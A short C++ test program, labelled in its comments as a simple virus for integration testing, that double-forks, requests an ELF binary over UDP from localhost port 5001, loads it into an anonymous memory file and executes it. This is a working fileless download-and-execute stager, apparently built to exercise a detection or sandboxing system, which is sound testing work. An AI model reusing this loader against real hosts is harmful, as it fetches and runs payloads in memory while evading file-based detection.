#include <algorithm>
#include <optional>
#include <span>
#include "common/anonymous_file_descriptor.hh"
#include "common/double_fork.hh"
#include "common/macros.hh"
#include "nostdlib/sys/select.hh"
#include "nostdlib/sys/socket.hh"

std::optional<size_t> download_elf(std::span<std::byte> buffer) {
  int s = vf::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (s == -1) {
    return {};
  }
  ::sockaddr_in sa{};
  sa.sin_family = AF_INET;
  // Connect to server
  sa.sin_addr.s_addr = vf::inet_addr(127, 0, 0, 1);
  sa.sin_port = htons(5001);

  if (vf::sendto(s, STR_LITERAL("hello"), 5, 0, (struct sockaddr*)&sa,
                 sizeof(sa)) == -1) {
    return {};
  }

  // do not optimize and put inside rodata.
  volatile timeval timeout{};
  timeout.tv_usec = 5000;

  fd_set fdset;
  FD_ZERO(&fdset);
  FD_SET(s, &fdset);

  int n = 0;
  size_t cur_offset = 0;
  do {
    socklen_t len;
    size_t chunk_size = std::min((size_t)4096, buffer.size() - cur_offset);

    int retval = vf::select(s + 1, &fdset, NULL, NULL, (timeval*)&timeout);
    if (retval == -1 || retval == 0) {
      if (cur_offset == 0) {
        return {};
      } else {
        break;
      }
    }
    n = vf::recvfrom(s, (void*)(buffer.data() + cur_offset), chunk_size, 0,
                     (struct sockaddr*)&sa, &len);
    if (n > 0) {
      cur_offset += n;
    }
  } while (n > 0);
  return cur_offset;
}

// A simple virus that is used in integration testing.
int main() {
  auto work = []() {
    constexpr size_t initial_size = 4096 * 200;
    // Passing an empty name as "" would create a one byte rodata.
    const char name[1] = {};
    vf::common::AnonymousFileDescriptor fd(name, 0, initial_size);
    fd.truncate(initial_size);

    auto ret = download_elf(std::span(fd.mutable_base(), initial_size));
    if (ret) {
      fd.truncate(ret.value());
      fd.execve();
    }
  };

  vf::common::double_fork([&work]() { work(); });
  return 0;
}